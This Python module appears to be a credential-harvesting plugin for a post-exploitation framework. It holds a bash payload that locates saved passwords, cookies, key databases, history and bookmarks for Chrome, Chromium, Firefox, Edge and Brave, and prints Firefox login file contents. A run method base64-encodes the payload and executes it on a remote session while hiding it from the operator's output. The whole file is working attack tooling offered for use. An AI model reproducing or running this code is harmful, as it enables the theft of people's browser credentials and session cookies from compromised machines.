"""Browser credentials extractor."""

from ..base import OperatorScript, ScriptResult


class BrowserCreds(OperatorScript):
    """Extract Chrome, Firefox, Edge credentials."""
    
    name = "Browser Credentials"
    description = "Extract saved passwords from browsers"
    category = "harvest"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] BROWSER CREDENTIALS EXTRACTOR"
echo "================================="
echo ""

echo "[+] Chrome/Chromium Login Data:"
find / -path "*/.config/google-chrome/*/Login Data" -o -path "*/.config/chromium/*/Login Data" 2>/dev/null | while read file; do
    echo "[!] $file"
    ls -la "$file"
done
echo ""

echo "[+] Chrome Cookies:"
find / -path "*/.config/google-chrome/*/Cookies" 2>/dev/null | head -5
echo ""

echo "[+] Firefox profiles:"
find / -path "*/.mozilla/firefox/*.default*/logins.json" 2>/dev/null | while read file; do
    echo "[!] $file"
    ls -la "$file"
    echo "Content preview:"
    cat "$file" 2>/dev/null | head -10
done
echo ""

echo "[+] Firefox key database:"
find / -path "*/.mozilla/firefox/*.default*/key4.db" 2>/dev/null
echo ""

echo "[+] Edge credentials:"
find / -path "*/.config/microsoft-edge/*/Login Data" 2>/dev/null
echo ""

echo "[+] Brave credentials:"
find / -path "*/.config/BraveSoftware/Brave-Browser/*/Login Data" 2>/dev/null
echo ""

echo "[+] Browser history (for target discovery):"
find / -name "History" -path "*/.config/google-chrome/*" 2>/dev/null | head -3
find / -name "places.sqlite" -path "*/.mozilla/firefox/*" 2>/dev/null | head -3
echo ""

echo "[+] Saved bookmarks:"
find / -name "Bookmarks" -path "*/.config/google-chrome/*" 2>/dev/null | head -3
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Extracting browser credentials...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Browser credentials extraction executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
